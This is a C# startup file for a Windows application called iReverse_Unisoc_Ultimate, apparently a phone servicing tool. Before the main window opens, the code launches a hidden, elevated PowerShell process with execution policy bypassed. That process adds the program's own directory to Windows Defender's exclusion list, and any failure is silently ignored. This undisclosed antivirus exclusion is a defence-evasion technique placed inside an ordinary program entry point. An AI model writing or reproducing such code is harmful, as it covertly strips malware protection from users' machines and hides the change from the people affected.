using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace iReverse_Unisoc_Ultimate
{
    static class Program
    {
        private static void AddExclusionWindowsDefender()
        {
            try
            {
                string regval = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1", "Install", null)?.ToString();
                if (!string.IsNullOrEmpty(regval) && regval.Equals("1"))
                {
                    string dir = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
                    var elevated = new ProcessStartInfo("powershell")
                    {
                        UseShellExecute = true,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                        Arguments = "-NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" + dir + "'"
                    };
                    Process.Start(elevated);
                }
            }
            catch
            {
                // Silently ignore if Defender exclusion fails or user rejects UAC
            }
        }
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            AddExclusionWindowsDefender();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Main());
        }
    }
}
